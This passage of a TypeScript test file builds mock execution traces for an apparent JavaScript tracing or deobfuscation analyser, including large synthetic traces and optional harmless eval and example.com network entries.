    const entries = Array.from({ length: 10000 }, (_, i) => ({
      timestamp: Date.now() + i,
      type: 'operation' as const,
      data: { operation: `op_${i}`, value: i }
    }));

    return {
      entries,
      constants: new Set(Array.from({ length: 1000 }, (_, i) => i.toString())),
      decodedStrings: Array.from({ length: 100 }, (_, i) => `string_${i}`),
      stats: {
        totalStringOperations: 500,
        totalStringDecodings: 100,
        totalFunctionCalls: 200,
        totalVariableAccesses: 1000,
        uniqueConstants: 1000,
        totalEntries: 10000,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 5, current: [] },
      performance: { executionTime: 1000, peakMemoryMB: 64, finalMemoryMB: 32 },
      warnings: [],
    };
  }

  function createMockTrace(name = 'mock', options: any = {}): ExecutionTrace {
    return {
      entries: options.hasEval ? [
        { timestamp: Date.now(), type: 'eval_call', data: { code: 'test' } }
      ] : options.hasNetwork ? [
        { timestamp: Date.now(), type: 'network_request', data: { url: 'https://example.com' } }
      ] : [],
      constants: new Set([name]),
      decodedStrings: [],
      stats: {
        totalStringOperations: 0,
        totalStringDecodings: 0,
        totalFunctionCalls: 1,
        totalVariableAccesses: 0,
        uniqueConstants: 1,
        totalEntries: 1,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 1, current: [] },
      performance: { executionTime: 10, peakMemoryMB: 1, finalMemoryMB: 1 },
      warnings: [],
    };
  }
});